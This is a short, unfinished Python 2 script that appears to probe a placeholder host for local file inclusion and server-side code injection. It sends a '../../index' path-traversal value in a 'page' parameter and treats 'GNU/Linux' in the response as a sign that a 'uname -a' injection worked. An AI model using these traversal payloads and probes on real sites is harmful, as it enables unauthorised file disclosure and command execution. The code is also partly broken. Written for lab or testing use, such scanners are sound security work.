import requests
import ssci

BASE_URL = "http://target.com/"

def injectPayload(url, paramname, method, payload):
	#finds index.php at base
	parsedURL = BASE_URL + url	
	html = ""	
	#if get
	if method == "GET":
		getURL = parsedURL + "?" + paramname+"="+payload
		content = requests.get(getURL)
		html =  content.text
		#instead of printing, i want to return the payload if true!

	#if post
	elif method == "POST":
		print("POST")

	print checkSuccess(html)

def checkSuccess(html):
#server side injection:

	#included index.php
	indexPHP = requests.get(BASE_URL + "index.php")
	if indexPHP.text in html:
		return "SSCI"
	#uname -a successful:
	if "GNU/Linux" in html:
		return "SSCI"

	

if __name__ == "__main__":
	
	url = "/serverside/lfi1.php"
	payload = "../../index.php"
	injectPayload(url, "page", "GET", "../../index")
